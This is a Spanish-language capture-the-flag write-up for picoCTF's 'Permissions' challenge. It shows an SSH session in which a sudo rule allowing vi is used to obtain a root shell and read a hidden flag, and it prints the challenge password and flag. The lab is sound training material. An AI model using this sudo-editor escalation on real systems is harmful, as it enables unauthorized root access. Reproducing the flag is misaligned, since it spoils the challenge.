### Permissions
#### Descripción

¿Se pueden leer los archivos del archivo raíz?El administrador del sistema ha creado una cuenta para ti en el servidor principal:`ssh -p 56777 picoplayer@saturn.picoctf.net`Contraseña: `e3pn6lmvHt`¿Puedes iniciar sesión y leer el archivo raíz?

## Solucion
```
Ale5623-picoctf@webshell:~$ ssh -p 56777 picoplayer@saturn.picoctf.net
The authenticity of host '[saturn.picoctf.net]:56777 ([13.59.203.175]:56777)' can't be established.
ED25519 key fingerprint is SHA256:HKm/Bw1C+mhj23vO8tXULrgLFYvzP6gQH2IwgUiQTok.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[saturn.picoctf.net]:56777' (ED25519) to the list of known hosts.
picoplayer@saturn.picoctf.net's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 6.8.0-1044-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

picoplayer@challenge:~$ pwd
/home/picoplayer
picoplayer@challenge:~$ ls
picoplayer@challenge:~$ ls
picoplayer@challenge:~$ cd/ root
-bash: cd/: No such file or directory
picoplayer@challenge:~$ cd /root
-bash: cd: /root: Permission denied
picoplayer@challenge:~$ sudo -l
[sudo] password for picoplayer: 
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
picoplayer@challenge:~$ sudo /usr/bin/vi

root@challenge:/home/picoplayer# whoami
root
root@challenge:/home/picoplayer# 
root@challenge:/home/picoplayer# cd /root
root@challenge:~# ls
root@challenge:~# ls
root@challenge:~# cat flag.txt
cat: flag.txt: No such file or directory
root@challenge:~# ls
root@challenge:~# ls -la
total 12
drwx------ 1 root root   23 Aug  4  2023 .
drwxr-xr-x 1 root root   51 Feb 23 03:27 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   35 Aug  4  2023 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
root@challenge:~# cat .flag.txt
picoCTF{uS1ng_v1m_3dit0r_f6ad392b}
root@challenge:~# 
```

### notas 
# Verificar permisos sudo

`sudo -l`

# Ejecutar vi como root

`sudo /usr/bin/vi`
Sirve para:  
Abrir el editor `vi` con privilegios de root.  
Como vi se ejecuta como root, cualquier comando que ejecutes dentro tambien sera root.
# Verificar que ya eres root

`whoami`
# Entrar al directorio root

`cd /root`
# Ver archivos ocultos

`ls -la`